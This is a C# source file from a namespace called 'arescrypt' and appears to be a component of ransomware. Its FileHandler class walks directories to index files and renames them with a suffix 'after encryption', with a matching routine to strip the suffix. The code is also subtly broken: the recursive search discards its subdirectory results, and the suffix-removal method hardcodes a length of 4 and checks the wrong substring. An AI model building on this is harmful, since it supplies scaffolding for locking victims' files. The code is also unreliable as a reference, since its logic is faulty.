using System;
using System.IO;
using System.Collections.Generic;

namespace arescrypt
{
    class FileHandler
    {
        // Recursivly list files in a given directory
        public static List<string> DirSearch(string sDir)
        {
            var fileIndex = new List<string> { };
            try
            {
                foreach (string file in Directory.GetFiles(sDir)) // Search current directory
                    fileIndex.Add(file);
                foreach (string dir in Directory.GetDirectories(sDir))
                {
                    foreach (string file in Directory.GetFiles(dir))
                        fileIndex.Add(file);
                    DirSearch(dir); // Search subdirectories
                }
            } catch (Exception) { }

            return fileIndex;
        }

        // Append specified suffix to filenames (preferably after encryption)
        public static bool appendSuffixToFile(string suffix, string filename)
        {
            if (filename.Contains(suffix))
                return false;
            else
            {
                try
                {
                    File.Move(filename, filename + suffix);
                    if (File.Exists(filename + suffix)) // Check if filename was changed. 
                        return true;
                    else
                        return false;
                } catch (Exception) { return false; }
            }
        }

        public static bool subtractSuffixFromFile(string suffix, string filename)
        {
            if (!filename.Contains(suffix))
                return false;
            else
            {
                File.Move(filename, filename.Substring(0, filename.Length - 4));
                if (File.Exists(filename.Substring(filename.Length - 4)))
                    return true;
                else
                    return false;
            }
        }

    }
}
